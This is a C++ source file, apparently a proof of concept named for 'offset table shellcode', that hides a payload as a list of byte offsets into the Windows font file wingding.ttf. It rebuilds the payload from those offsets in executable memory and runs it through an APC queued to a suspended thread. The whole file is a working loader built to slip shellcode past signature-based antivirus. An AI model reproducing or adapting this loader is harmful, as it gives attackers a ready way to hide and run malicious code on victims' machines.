// OffsetTablesShellcode.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。
//


#include <stdio.h>
#include <Windows.h>



int main()
{	

	DWORD dwReadSize=0;
	HANDLE hFile = CreateFileA("C:\\Windows\\Fonts\\wingding.ttf", GENERIC_READ, OPEN_EXISTING, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	DWORD dwSize = GetFileSize(hFile, NULL);
	PCHAR pDict = (PCHAR)VirtualAlloc(NULL, dwSize, MEM_COMMIT, PAGE_READWRITE);
	PCHAR lpBuffer = (PCHAR)VirtualAlloc(NULL, 0x1000, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	ReadFile(hFile, pDict, dwSize, &dwReadSize, NULL);

	
	DWORD offsets[] = { 2741, 2231, 2569, 2741, 65, 203, 113, 48, 2899, 2707, 825, 48, 2845, 157, 2473, 2317, 11, 2473, 93, 363, 2473, 93, 282, 2473, 2059, 128, 2473, 2395, 95, 2473, 155, 146, 17, 1783, 2341, 64, 2173, 1, 629, 288, 19, 2215, 2473, 141, 203, 203, 2473, 2053, 83, 2473, 29, 549, 159, 1, 2255, 2473, 547, 1783, 2473, 2179, 95, 1, 2231, 721, 745, 14, 2473, 745, 2473, 1, 160, 48, 288, 48, 557, 135, 573, 645, 557, 65, 358, 2797, 387, 1717, 1, 82, 2231, 113, 80, 227, 203, 549, 2341, 19, 2473, 2179, 203, 1, 2231, 108, 2473, 363, 2089, 2473, 2179, 282, 1, 2231, 2473, 9, 2473, 1, 2315, 211, 12, 203, 282, 78, 2809, 2707, 128, 1885, 263, 211, 2399, 211, 2803, 156, 195, 2107, 421, 176, 2131, 2315, 1041, 288, 288, 288, 211, 2053, 9, 2761, 2395, 2771, 407, 126, 597, 282, 203, 2131, 2315, 195, 288, 288, 288, 211, 2053, 128, 156, 141, 141, 95, 1405, 156, 833, 47, 1915, 157, 156, 2341, 126, 173, 301, 11, 1421, 219, 151, 203, 131, 211, 43, 59, 288, 2149, 9, 211, 2803, 355, 2761, 2647, 2611, 62, 75, 597, 282, 203, 2131, 2315, 123, 288, 288, 288, 156, 221, 159, 63, 95, 156, 78, 110, 173, 209, 156, 62, 173, 126, 126, 48, 1421, 219, 151, 203, 131, 211, 721, 156, 63, 95, 95, 95, 156, 62, 13, 2059, 649, 156, 301, 221, 77, 95, 156, 221, 1903, 95, 108, 156, 31, 173, 141, 141, 48, 2845, 219, 28, 203, 23, 211, 19, 48, 2899, 2131, 13, 2125, 2131, 288, 258, 48, 557, 355, 288, 2149, 128 };
	
	for (int i = 0; i < sizeof(offsets)/sizeof(DWORD); i++)
	{
		lpBuffer[i] = pDict[offsets[i]];
	}
	


	HANDLE hThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)0xfff, 0, CREATE_SUSPENDED, NULL);
	QueueUserAPC((PAPCFUNC)lpBuffer, hThread, 0);
	ResumeThread(hThread);
	WaitForSingleObject(hThread, INFINITE);

	CloseHandle(hThread);
	CloseHandle(hFile);
	return 0;
}